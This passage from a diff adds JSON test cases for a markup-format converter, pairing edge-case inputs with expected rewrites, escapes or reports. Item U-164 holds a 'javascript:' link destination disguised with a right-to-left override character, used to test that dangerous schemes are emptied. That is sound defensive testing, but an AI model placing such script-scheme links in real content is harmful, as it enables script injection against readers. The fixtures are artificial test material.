+    "title": "Definition-shaped text in a quote",
+    "inputs": [
+      "> [f]:"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-135",
+    "title": "Trailing blank line of an unclosed code fence",
+    "inputs": [
+      "```\n\n",
+      "- q\n  ```\n\ntail\n",
+      "1. item\n    ```\n\n   See[^c]\n\n[^c]: para\n",
+      ":: t\n: ```\n  code\n\nafter\n"
+    ],
+    "outputs": [
+      "```\n\n```\n",
+      "- q\n  ```\n\n  ```\ntail\n",
+      "1. item\n    ```\n\n   See[^c]\n\n    ```\n[^c]: para\n",
+      ":: t\n: ```\n  code\n\n  ```\nafter\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-136",
+    "title": "Literal inline brace comment opener",
+    "inputs": [
+      "{%\n%}x"
+    ],
+    "outputs": [
+      "\\{%\n%}x"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-137",
+    "title": "Attribute text in an otherwise empty list item",
+    "inputs": [
+      "- {k}",
+      "- {.k}\ntail\n",
+      "- {.a}\ntail\n",
+      "-{} A bare item via the empty block.\n",
+      "::: note\n> - para\n> - {#x}\n```\ncode\n::::\n:::\nafter *b*\n"
+    ],
+    "outputs": [
+      "- {% %}",
+      "- {% %}\n\ntail\n",
+      "- {% %}\n\ntail\n",
+      "- A bare item via the empty block.\n",
+      "::: note\n> - para\n> - {% %}\n```\ncode\n::::\n:::\nafter *b*\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-138",
+    "title": "Caret line after an eligible block",
+    "inputs": [
+      ">\n^ p"
+    ],
+    "outputs": [
+      ">\n\n^ p"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-139",
+    "title": "Empty inline footnote label",
+    "inputs": [
+      "x^[]"
+    ],
+    "outputs": [
+      "x\\^[]"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-140",
+    "title": "Tab as table cell padding",
+    "inputs": [
+      "|\t|"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-141",
+    "title": "Attribute line consumed by a quote",
+    "inputs": [
+      "> {k}\nt",
+      "> {k}\nt\n",
+      "> {x}\nt\n",
+      "> {#x}\na\n",
+      "- > {.x\n  >  .y}\nplain\n",
+      "> > - {.x\n> >    .y}\nplain\n"
+    ],
+    "outputs": [
+      ">\nt",
+      ">\nt\n",
+      ">\nt\n",
+      ">\na\n",
+      "- >\nplain\n",
+      "> > - {% %}\n\nplain\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-142",
+    "title": "Attribute text in an otherwise empty description",
+    "inputs": [
+      ":: t\n: {empty}\n",
+      ":: t\n: {empty}\nflush\n",
+      ":: t1\n: {empty}\n:: t2\n: {empty}\n"
+    ],
+    "outputs": [
+      ":: t\n: {% %}\n",
+      ":: t\n: {% %}\n\nflush\n",
+      ":: t1\n: {% %}\n:: t2\n: {% %}\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-143",
+    "title": "Adjacent inline delimiters use the 0.2 flanking and nesting rules",
+    "inputs": [
+      "/{/",
+      "*a *b*{.x}\n",
+      "//a/ and snake_/case/\n",
+      "*{=a*{k=b=}\n",
+      "={/a={k=b/}\n",
+      "a*{_k=b_}\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-145",
+    "title": "Adjacent mixed strong and emphasis delimiters change nesting",
+    "inputs": [
+      "/*//"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-147",
+    "title": "A plus row continues the current table rather than ending its row",
+    "inputs": [
+      "||\n+||"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-148",
+    "title": "A reference to a heading uses the heading's folded source or rendered plain text",
+    "inputs": [
+      "# \t%%h"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-150",
+    "title": "Table width or row-section metadata changes generated columns",
+    "inputs": [
+      "{widths=5}\n|||"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-151",
+    "title": "Bare underline and strike markers have 0.2 brace boundaries",
+    "inputs": [
+      "_{_"
+    ],
+    "outputs": [
+      "{_{_}"
+    ],
+    "class": "report"
+  },
+  {
+    "id": "U-152",
+    "title": "A table span marker after padded cell content is reinterpreted",
+    "inputs": [
+      "||\t<|"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-153",
+    "title": "A tab after a list marker is stripped as marker padding",
+    "inputs": [
+      "- \te"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-154",
+    "title": "A footnote reference inside a link renders its own anchor",
+    "inputs": [
+      "^[ [^1]]\n[^1]: n",
+      "a [t^[n]](/u) b\n",
+      "[[ ^[b]]()]()\n",
+      "[t ^[x [a](u) b]](/w)\n"
+    ],
+    "outputs": [
+      "^[ [^1]]\n\n[^1]: n"
+    ],
+    "class": "report"
+  },
+  {
+    "id": "U-155",
+    "title": "A percent comment or braced subscript changes inline scanning",
+    "inputs": [
+      "a\t%%"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-157",
+    "title": "A code fence info string and closer have 0.2 boundary rules",
+    "inputs": [
+      "```s \"\"u"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-158",
+    "title": "An unresolved reference writes its label and attached attributes from the folded key",
+    "inputs": [
+      "[\\[][]",
+      "[a][a]{.c}{#i}\n",
+      "[a][b]{.c}{.d}\n",
+      "x[a][a]{key=v}{#i}\n",
+      "[a][]{#i}{.c}\n",
+      "[\\*][]"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-159",
+    "title": "A task marker changes item HTML and state metadata",
+    "inputs": [
+      "- [x] a  h"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-160",
+    "title": "Whitespace within a footnote reference label normalizes before lookup",
+    "inputs": [
+      "x[^f\ng]\n[^f g]: n",
+      "see [^a\tb]\n\n[^a b]: note\n"
+    ],
+    "outputs": [
+      "x[^f\ng]\n\n[^f g]: n"
+    ],
+    "class": "report"
+  },
+  {
+    "id": "U-161",
+    "title": "A multiline reference label is normalized or remains literal",
+    "inputs": [
+      "![][a\nb]"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-162",
+    "title": "Glued cell alignment marks with a vertical mark are braced",
+    "inputs": [
+      "|?v |"
+    ],
+    "outputs": [
+      "|{?v} |"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-163",
+    "title": "A task box after extra marker padding is ordinary item text",
+    "inputs": [
+      "-  [ ] q"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-164",
+    "title": "A link destination containing a dangerous script scheme is emptied",
+    "inputs": [
+      "[](‮javascript:)"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-165",
+    "title": "A brace attribute after a table cell marker attaches to that cell, and a structural span can replace it",
+    "inputs": [
+      "|{#x}|",
+      "|{.total} 99 |\n|{.total}99 |\n",
+      "|{rowspan=2} a | b |\n| c | d |\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-166",
+    "title": "A reference label beginning with an at-sign is reserved for citation syntax",
+    "inputs": [
+      "[][@a]"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-167",
+    "title": "A head-row alignment marker applies its alignment to a physical column",
+    "inputs": [
+      "|=|\n|:-|"
+    ],
+    "outputs": [
+      "|=|\n"
+    ],
+    "class": "report"
+  },
+  {
+    "id": "U-168",
+    "title": "An equals marker at a table edge creates header cells or rows",
+    "inputs": [
+      "|=||"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-169",
+    "title": "A brace block after an item marker is not a free-standing attribute line",
+    "inputs": [
+      "-{k} {#h}"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-170",
+    "title": "A tag or mention name stops before a trailing hyphen",
+    "inputs": [
+      "@a-"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-171",
+    "title": "A multiline image label changes block-image eligibility",
+    "inputs": [
+      "![\n]()"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-172",
+    "title": "A loose key on a description list remains an ordinary HTML attribute",
+    "inputs": [
+      "{loose}\n:: T"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-174",
+    "title": "A heading strips marker-adjacent tab padding before inline parsing",
+    "inputs": [
+      "# \tx"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-175",
+    "title": "A blank inline-link destination is text rather than an empty link",
+    "inputs": [
+      "[]( )"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-176",
+    "title": "A carriage return in a heading boundary is normalized as a line ending",
+    "inputs": [
+      "# T\rb"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-177",
+    "title": "Footnote body after a continuation marker",
+    "inputs": [
+      "[^a]: o\n+\n e\n\ns"
+    ],
+    "outputs": [
+      "[^a]: o\n\n{% %}\n e\n\ns"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-178",
+    "title": "Div label in its metadata slot",
+    "inputs": [
+      ":::[+]"
+    ],
+    "outputs": [
+      "::: [+]"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-179",
+    "title": "Fence at a description boundary",
+    "inputs": [
+      ":: t\n: ```\n y",
+      ":: t\n: a\n  ```\n  b\n y\n  ```",
+      ":: t\n: a\n  ```\n  b\n\n y\n  ```",
+      ":: t\n: a\n  ```\n  b\n y\n```",
+      ":: t\n: a\n  ```\n  :::\n y\n  ```"
+    ],
+    "outputs": [
+      ":: t\n: ```\ny",
+      ":: t\n: a\n  ```\n  b\n  ```\ny\n  ```",
+      ":: t\n: a\n  ```\n  b\n\n  ```\ny\n  ```",
+      ":: t\n: a\n  ```\n  b\n  ```\ny\n```",
+      ":: t\n: a\n  ```\n  :::\n  ```\ny\n  ```"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-180",
+    "title": "Description mark at the term column",
+    "inputs": [
+      ":: t\n : b"
+    ],
+    "outputs": [
+      " :: t\n : b"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-181",
+    "title": "Tag sigil in escaped angle text",
+    "inputs": [
+      "\\</#x>"
+    ],
+    "outputs": [
+      "\\</\\#x>"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-182",
+    "title": "Braced inline opener in a bracket",
+    "inputs": [
+      "[{^]^}",
+      "[{*a]*}\n",
+      "[{/a]/}\n"
+    ],
+    "outputs": [
+      "[\\{^]^}",
+      "[{\\*a]*}\n",
+      "[{\\/a]/}\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-183",
+    "title": "Unresolved block image reference before a caption",
+    "inputs": [
+      "![a][nope]\n^ cap\n"
+    ],
+    "outputs": [
+      "\\![a][nope]\n^ cap\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-184",
+    "title": "Nested list include-looking brace",
+    "inputs": [
+      "- {{ e }}\n  b\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-186",
+    "title": "Empty div label",
+    "inputs": [
+      ":::[]"
+    ],
+    "outputs": [
+      "::: []"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-187",
+    "title": "At-sign bracket definition",
+    "inputs": [
+      "[@]: y"
+    ],
+    "outputs": [
+      " [@]: y"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-188",
+    "title": "Plus-minus shorthand inside a colon pair",
+    "inputs": [
+      ":+-:"
+    ],
+    "outputs": [
+      ":\\+-:"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-189",
+    "title": "Empty footnote label followed by braces",
+    "inputs": [
+      "d[^]{}"
+    ],
+    "outputs": [
+      "d[\\^]{}"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-190",
+    "title": "Smart quote in punctuation and opaque attribute boundaries",
+    "inputs": [
+      "x{.k title=\"`\"} y\n"
+    ],
+    "outputs": [
+      "x{.k title=“`\"} y`\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-192",
+    "title": "Language Shorthand Before An Explicit Lang Key",
+    "inputs": [
+      "[]{:r lang}\n",
+      "{:fr}\n{lang=de}\nText\n"
+    ],
+    "outputs": [
+      "[]{lang}\n",
+      "{lang=de}\nText\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-193",
+    "title": "Tab Stripped After A Description Mark",
+    "inputs": [
+      ":: \tx\n"
+    ],
+    "outputs": [
+      ":: \tx\n"
+    ],
+    "class": "report"
+  },
+  {
+    "id": "U-194",
+    "title": "Tab Stripped At A Table Cell Edge",
+    "inputs": [
+      "|\t---|\n"
+    ],
+    "outputs": [
+      "|\t---|\n"
+    ],
+    "class": "report"
+  },
+  {
+    "id": "U-195",
+    "title": "Inline Markup In A Div Label Metadata Slot",
+    "inputs": [
+      ":::[`x`]\nbody\n:::\n"
+    ],
+    "outputs": [
+      ":::[`x`]\nbody\n:::\n"
+    ],
+    "class": "report"
+  },
+  {
+    "id": "U-197",
+    "title": "Attribute consumed at a list boundary",
+    "class": "rewrite",
+    "inputs": [
+      "- a\n  {.k}\n# H\n",
+      "- a\n  {.x}\ntail\n",
+      "- a\n\n  {.x}\n- b\n"
+    ],
+    "outputs": [
+      "- a\n\n# H\n",
+      "- a\n\ntail\n",
+      "- a\n\n\n- b\n"
+    ]
+  },
+  {
+    "id": "U-198",
+    "title": "Empty side of a replacement",
+    "class": "report",
+    "inputs": [
+      "{~a~>~}\n",
+      "{~~>b~}\n",
+      "{~~>~}\n"
+    ],
+    "outputs": [
+      "{~a~>~}\n",
+      "{~~>b~}\n",
+      "{~~>~}\n"
+    ]
+  },
+  {
+    "id": "U-199",
+    "title": "Block boundary after a description body",
+    "class": "rewrite",
+    "inputs": [
+      ":: t\n:  d\n   {.k}\ntail\n",
+      ":: term\n:  definition\n > quote\n",
+      "- one\n :: term\n :  def\n",
+      ":: term\n: first\n\n second\n",
+      ":: term\n:  first\n\n  second\n",
+      ":: t\n:  %% c\n flush\n",
+      ":: t\n:  %% c\n  flush\n",
+      ":: t\n: :::\n y\n  :::\n"
+    ],
+    "outputs": [
+      ":: t\n:  d\n\ntail\n",
+      ":: term\n:  definition\n\n> quote\n",
+      "- one\n\n:: term\n:  def\n",
+      ":: term\n: first\n\nsecond\n",
+      ":: term\n:  first\n\nsecond\n",
+      ":: t\n:  %% c\nflush\n",
+      ":: t\n:  %% c\nflush\n",
+      ":: t\n: :::\ny\n  :::\n"
+    ]
+  },
+  {
+    "id": "U-200",
+    "title": "Literal attribute after a replacement",
+    "class": "rewrite",
+    "inputs": [
+      "{~a~>b~}{.k} c\n",
+      "{~a~>b~}{#i} c\n"
+    ],
+    "outputs": [
+      "{-a-}{+b+}\\{.k} c\n",
+      "{-a-}{+b+}\\{#i} c\n"
+    ]
+  },
+  {
+    "id": "U-204",
+    "title": "Fence after a continuation marker",
+    "class": "rewrite",
+    "inputs": [
+      ":: t\n:  d\n+\n```\na\n\nb\n```\n",
+      "- x\n+\n```\na\n\nb\n```\n\nz\n"
+    ],
+    "outputs": [
+      ":: t\n:  d\n  ```\n  a\n\n  ```\nb\n```\n",
+      "- x\n  ```\n  a\n\n  ```\nb\n```\n\nz\n"
+    ]
+  },
+  {
+    "id": "U-206",
+    "title": "Cross-reference default display text",
+    "class": "report",
+    "inputs": [
+      "# *Setup*\n\nSee </#Setup>.\n",
+      "# A </#A>\n",
+      "# A </#B>\n\n# B </#A>\n",
+      "{#t}\n| b |\n^ #y#\n\n</#t>\n"
+    ],
+    "outputs": []
+  },
+  {
+    "id": "U-207",
+    "title": "Literal attribute after an unresolved footnote",
+    "class": "report",
+    "inputs": [
+      "Text[^a]{.c}{#i}.\n"
+    ],
+    "outputs": []
+  },
+  {
+    "id": "U-209",
+    "title": "Unresolved container continuation ownership",
+    "class": "report",
+    "inputs": [
+      "> quoted\n+\n- item\n> more\n",
+      "- +\n::: note\n\n  tail\n",
+      ":: t\n: +\n```\na\n\n  ```\n  c\n",
+      "- a\n  - +\n  > b\n"
+    ],
+    "outputs": [
+      "> quoted\n>\n> - item\n> more\n",
+      "- +\n::: note\n\n  tail\n",
+      ":: t\n: +\n```\na\n\n  ```\n  c\n",
+      "- a\n  - +\n  > b\n"
+    ]
+  },
+  {
+    "id": "U-210",
+    "title": "Definition consumed inside a description body",
+    "class": "rewrite",
+    "inputs": [
+      ":: term\n:  [r]: /u\n\nsee [t][r]\n",
+      ":: term\n:  [^f]: x\n\nsee[^f]\n",
+      ":: t\n:  [^q]: note\n   * child\n\nr[^q]\n",
+      ":: t\n: [^q]: note\n\n  - child\n\nr[^q]\n"
+    ],
+    "outputs": [
+      "[r]: /u\n\n:: term\n: {% %}\n\nsee [t][r]\n",
+      "[^f]: x\n\n:: term\n: {% %}\n\nsee[^f]\n",
+      "[^q]: note\n\n:: t\n: {% %}\n   * child\n\nr[^q]\n",
+      "[^q]: note\n\n:: t\n: {% %}\n\n  - child\n\nr[^q]\n"
+    ]
+  },
+  {
+    "id": "U-211",
+    "title": "Multiline block attribute boundary",
+    "class": "rewrite",
+    "inputs": [
+      "{.a\n\t.b}\n\nparagraph\n",
+      "> {.x\n>   .y}\n> # H\n",
+      "> {.a}{title=\"𝒜𝒜\"}{.b\n>                   .c}\n> p\n"
+    ],
+    "outputs": [
+      "{.a .b}\nparagraph\n",
+      "> {.x .y}\n> # H\n",
+      "> {.a}{title=\"𝒜𝒜\"}{.b .c}\n> p\n"
+    ]
+  },
+  {
+    "id": "U-212",
+    "title": "Literal caret after a quote line",
+    "class": "escape",
+    "inputs": [
+      "> a\n ^ cap\n",
+      "> ^ x\n ^ cap\n",
+      "> q\n^ %% x\n"
+    ],
+    "outputs": [
+      "> a\n \\^ cap\n",
+      "> ^ x\n \\^ cap\n",
+      "> q\n\\^ %% x\n"
+    ]
+  },
+  {
+    "id": "U-213",
+    "title": "Definition consumed inside a list item",
+    "class": "rewrite",
+    "inputs": [
+      "See [^a].\n\n- [^a]: note body\n",
+      "- lead\n1. [t]: /t\n\nSee [t][].\n",
+      "r[^n]\n\n- [^n]: :: t\n  - x\n"
+    ],
+    "outputs": [
+      "[^a]: note body\n\nSee [^a].\n\n- {% %}\n",
+      "[t]: /t\n\n- lead\n1. {% %}\n\nSee [t][].\n",
+      "[^n]: :: t\n\nr[^n]\n\n- {% %}\n  - x\n"
+    ]
+  },
+  {
+    "id": "U-214",
+    "title": "Unclosed table cell code span",
+    "class": "rewrite",
+    "inputs": [
+      "| a `b | c d |\n",
+      "| a ``b | c |\n",
+      "| a !`b | c d |\n",
+      "| a `b | c d |\n| e | f |\n"
+    ],
+    "outputs": [
+      "| a `b | c d` |\n",
+      "| a ``b | c`` |\n",
+      "| a !`b | c d` |\n",
+      "| a `b | c d` |\n| e | f |\n"
+    ]
+  },
+  {
+    "id": "U-215",
+    "title": "Invisible percent span between container blocks",
+    "class": "rewrite",
+    "inputs": [
+      "> %%%\n> secret\n%%%\n> more\n",
+      ":: t\n%%%\na\n%%%\n: body\n",
+      ":: t\n  %%%\n      a\n  %%%\n:  body\n",
+      ":: t\n%%%\na\n%%%\n:: u\n: body\n"
+    ],
+    "outputs": [
+      "> more\n",
+      ":: t\n: body\n",
+      ":: t\n:  body\n",
+      ":: t\n:: u\n: body\n"
+    ]
+  },
+  {
+    "id": "U-216",
+    "title": "Invisible brace comment before a block image or paragraph",
+    "class": "rewrite",
+    "inputs": [
+      "{%%}![alt](x.png)\n",
+      "{.c}\n{%%}![a](x.png)\n",
+      "![a](/i) %% c\n^ cap\n",
+      "![a](/i){%%}\n^ cap\n"
+    ],
+    "outputs": [
+      "![alt](x.png)\n",
+      "![a](x.png){.c}\n",
+      "![a](/i)\n^ cap\n",
+      "![a](/i)\n^ cap\n"
+    ]
+  },
+  {
+    "id": "U-218",
+    "title": "Empty footnote body sentinel",
+    "class": "rewrite",
+    "inputs": [
+      "See[^f]\n\n[^f]: {empty}\n",
+      "See[^f]\n\n[^f]: {empty}\n\n"
+    ],
+    "outputs": [
+      "See[^f]\n\n[^f]: {% %}\n",
+      "See[^f]\n\n[^f]: {% %}\n\n"
+    ]
+  },
+  {
+    "id": "U-219",
+    "title": "Longer colon run closes a shorter div",
+    "class": "report",
+    "inputs": [
+      ":::\n::::\n",
+      ":::\nOuter\n\n::::\nInner\n::::\n:::\n",
+      ":::\n:::e\n::::\nq\n:::\nafter\n",
+      "- :::\n  :::e\n  ::::\n  :::\nl\n",
+      "> :::\n> :::e\n> ::::\n> q\n> :::\n\nafter\n"
+    ],
+    "outputs": []
+  },
+  {
+    "id": "U-221",
+    "title": "Wrapped link or image title",
+    "class": "report",
+    "inputs": [
+      "[a](/u \"t\nu\")\n",
+      "[a](/u 't\nu')\n",
+      "![a](/i \"t\nu\")\n"
+    ],
+    "outputs": []
+  },
+  {
+    "id": "U-222",
+    "title": "Div boundary at its owning column",
+    "class": "rewrite",
+    "inputs": [
+      "- one\n ::: note\n b\n :::\n",
+      ":: t\n: - :::\n    :::\n q\n"
+    ],
+    "outputs": [
+      "- one\n::: note\n b\n :::\n",
+      ":: t\n: - :::\n    :::\nq\n"
+    ]
+  },
+  {
+    "id": "U-223",
+    "title": "Note-hosted description body column",
+    "class": "rewrite",
+    "inputs": [
+      "[^f]: :: t\n  : | a |\n ^ cap\n\n[^f]\n",
+      "[^n]: :: t\n  : # H\n    # I\nz\n\n[^n]\n"
+    ],
+    "outputs": [
+      "[^f]: :: t\n      : | a |\n^ cap\n\n[^f]\n",
+      "[^n]: :: t\n      : # H\n        # I\nz\n\n[^n]\n"
+    ]
+  },
+  {
+    "id": "U-225",
+    "title": "Caption caret followed by an empty comment",
+    "class": "escape",
+    "inputs": [
+      "![alt](u)\n^ %% hidden\n"
+    ],
+    "outputs": [
+      "![alt](u)\n\\^ %% hidden\n"
+    ]
+  },
+  {
+    "id": "U-226",
+    "title": "Display math line before a caption",
+    "class": "rewrite",
+    "inputs": [
+      "$$`x\n^ p\n",
+      "$$`a` %% c\n^ cap\n"
+    ],
+    "outputs": [
+      "$$`x`\n^ p\n",
+      "$$`a`\n^ cap\n"
+    ]
+  },
+  {
+    "id": "U-227",
+    "title": "Percent run inside a multiline brace comment",
+    "class": "report",
+    "inputs": [
+      "- {% a\n   %%%\n   z %}\nplain\n",
+      "1. {% a\n    %%% x\n    z %}\nplain\n"
+    ],
+    "outputs": [
+      "- {% a\n   \\%%%\n   z %}\nplain\n",
+      "1. {% a\n    \\%%% x\n    z %}\nplain\n"
+    ]
+  },
+  {
+    "id": "U-228",
+    "title": "Description sibling after a list item",
+    "class": "rewrite",
+    "inputs": [
+      ":: term\n: - a\n\n   > c\n",
+      ":: term\n: - a\n\n   - c\t\n",
+      ":: term\n: - a\n\n   - c\n"
+    ],
+    "outputs": [
+      ":: term\n: - a\n\n > c\n",
+      ":: term\n: - a\n\n - c\t\n",
+      ":: term\n: - a\n\n - c\n"
+    ]
+  },
+  {
+    "id": "U-229",
+    "title": "Note item follower at note content column",
+    "class": "rewrite",
+    "inputs": [
+      "[^f]: - :::::\n       :::::\n\n[^f]\n",
+      "[^f]: - | a |\n       ^ cap\n\n[^f]\n"
+    ],
+    "outputs": [
+      "[^f]: - :::::\n      :::::\n\n[^f]\n",
+      "[^f]: - | a |\n      ^ cap\n\n[^f]\n"
+    ]
+  },
+  {
+    "id": "U-230",
+    "title": "Conflicting ordered list start attribute",
+    "class": "rewrite",
+    "inputs": [
+      "{start=9}\n3. x\n"
+    ],
+    "outputs": [
+      "3. x\n"
+    ]
+  },
+  {
+    "id": "U-232",
+    "title": "Table row after a description body at the document column",
+    "class": "rewrite",
+    "inputs": [
+      ":: t\n: para\n | a |\n"
+    ],
+    "outputs": [
+      ":: t\n: para\n| a |\n"
+    ]
+  },
+  {
+    "id": "U-233",
+    "title": "Literal curly quote for old smart quote direction",
+    "class": "rewrite",
+    "inputs": [
+      ":a:\"q\"\n:long-name:'q'\n"
+    ],
+    "outputs": [
+      ":a:“q\"\n:long-name:‘q'\n"
+    ]
+  },
+  {
+    "id": "U-234",
+    "title": "Literal backslash run in unresolved reference",
+    "class": "rewrite",
+    "inputs": [
+      "[\\^][]",
+      "a [t\\^[n]][nope] b\n",
+      "a [t\\\\^[n]][nope] b\n",
+      "[a\\\\\\\nb][missing]\n"
+    ],
+    "outputs": [
+      "[\\\\\\^][]",
+      "a [t\\\\\\^[n]][nope] b\n",
+      "a [t\\\\\\\\\\^[n]][nope] b\n",
+      "[a\\\\\\\\\\\\\nb][missing]\n"
+    ]
+  },
+  {
+    "id": "U-235",
+    "title": "Nested item definition boundary",
+    "class": "report",
+    "inputs": [
+      "* * [d]: u\n  :\n",
+      "* * [d]: u\n%%\n:\n"
+    ],
+    "outputs": [
+      "* * {% %}\n\n  :\n",
+      "* * {% %}\n\n:\n"
+    ]
+  },
+  {
+    "id": "U-236",
+    "title": "Compound description sibling columns",
+    "class": "rewrite",
+    "inputs": [
+      ":: t\n :: u\n: d\n : e\n",
+      "[^n]: intro\n\n   :: term\n   :  definition\n\n     > quote\n\nsee[^n]\n"
+    ],
+    "outputs": [
+      ":: t\n:: u\n: d\n: e\n",
+      "[^n]: intro\n\n   :: term\n   :  definition\n\n   > quote\n\nsee[^n]\n"
+    ]
+  },
+  {
+    "id": "U-237",
+    "title": "Nested item follower at outer content column",
+    "class": "rewrite",
+    "inputs": [
+      "- x\n  - ::: d\n   y\n    :::\n",
+      "- a\n  * w\n  1. v\n    - u\n"
+    ],
+    "outputs": [
+      "- x\n  - ::: d\n  y\n    :::\n",
+      "- a\n  * w\n  1. v\n  - u\n"
+    ]
+  },
+  {
+    "id": "U-238",
+    "title": "List hosted fence continuation closer",
+    "class": "report",
+    "inputs": [
+      "- ```\n  x\n\n+\ntail\n"
+    ],
+    "outputs": [
+      "- ```\n  x\n\n  ```\n  tail\n"
+    ]
+  },
+  {
+    "id": "U-239",
+    "title": "Following fence outside description",
+    "class": "rewrite",
+    "inputs": [
+      ":: t\n: a\n\t```\n ```\n"
+    ],
+    "outputs": [
+      ":: t\n: a\n\t```\n```\n"
+    ]
+  },
+  {
+    "id": "U-240",
+    "title": "A language tag longer than eight characters is accepted",
+    "class": "report",
+    "inputs": [
+      "[a]{:abcdefgh} [b]{:abcdefghi}\n"
+    ],
+    "outputs": []
+  },
+  {
+    "id": "U-241",
+    "title": "A hardbreak div changes an unresolved reference fallback",
+    "class": "report",
+    "inputs": [
+      "::: \\\n[a\nb][missing]\n:::\n"
+    ],
+    "outputs": []
+  },
+  {
+    "id": "U-242",
+    "title": "An indented fence run remains code content",
+    "class": "rewrite",
+    "inputs": [
+      "{.x\n.y}\n```\nwa\n> q\n  ```\n"
+    ],
+    "outputs": [
+      "{.x\n.y}\n````\nwa\n> q\n  ```\n"
+    ]
+  },
+  {
+    "id": "U-243",
+    "title": "Backtick fence run inside a multiline brace comment",
+    "class": "report",
+    "inputs": [
+      "- {% a\n   ```\n   z %}\nplain\n"
+    ],
+    "outputs": [
+      "- {% a\n   \\```\n   z %}\nplain\n"
+    ]
+  },
+  {
+    "id": "U-244",
+    "title": "A floating block attribute crosses a footnote definition",
+    "class": "rewrite",
+    "inputs": [
+      "{.a}\n[^f]: note\n\nVisible\n"
+    ],
+    "outputs": [
+      "[^f]: note\n\n{.a}\nVisible\n"
+    ]
+  },
+  {
+    "id": "U-245",
+    "title": "A quoted list fence retains its blank code line",
+    "class": "rewrite",
+    "inputs": [
+      "> a\n>\n> 1. ```\n>    x\n>\n> y\n"
+    ],
+    "outputs": [
+      "> a\n>\n> 1. ```\n>    x\n>\n>    ```\n> y\n"
+    ]
+  },
+  {
+    "id": "U-246",
+    "title": "An unresolved footnote attribute and a heading ID are separated",
+    "class": "rewrite",
+    "inputs": [
+      "x[^n]{#i}\n\n## {#i}\n"
+    ],
+    "outputs": [
+      "x[^n]{\\#i}\n\n{#i}\n## \\{#i}\n"
+    ]
+  },
+  {
+    "id": "U-247",
+    "title": "A table row moves outside the preceding ordered item",
+    "class": "rewrite",
+    "inputs": [
+      "::: note\n10. para\n   | t |\n```\ncode\n::::\n:::\nafter *b*\n"
+    ],
+    "outputs": [
+      "::: note\n10. para\n| t |\n```\ncode\n::::\n:::\nafter *b*\n"
+    ]
+  },
+  {
+    "id": "U-248",
+    "title": "Rejected HTML control characters are replaced",
+    "class": "report",
+    "inputs": [
+      "cd\n"
+    ],
+    "outputs": []
+  },
+  {
+    "id": "U-249",
+    "title": "The inline math class key uses the canonical lowercase name",
+    "class": "report",
+    "inputs": [
+      "$`a`{CLASS=c}\n"
+    ],
+    "outputs": []
+  },
+  {
+    "id": "U-250",
+    "title": "A note fence moves outside an empty list item",
+    "class": "rewrite",
+    "inputs": [
+      "x[^1]\n\n- [^1]: ```\n    code\n\nafter\n"
+    ],
+    "outputs": [
+      "x[^1]\n\n- {% %}\n\n[^1]: ```\n      code\n\n      ```\nafter\n"
+    ]
+  },
+  {
+    "id": "U-251",
+    "title": "A task item consumes a nested footnote definition",
+    "class": "report",
+    "inputs": [
+      "[^n]: - [ ]  [^f]: x\n\nr[^n] [^f]\n"
+    ],
+    "outputs": []
+  },
+  {
+    "id": "U-252",
+    "title": "A task item changes nested description ownership",
+    "class": "report",
+    "inputs": [
+      "- [x]   - :: term\n           : desc\n           :: next\n           : body\n"
+    ],
+    "outputs": []
+  },
+  {
+    "id": "U-253",
+    "title": "An open div is closed before a footnote definition",
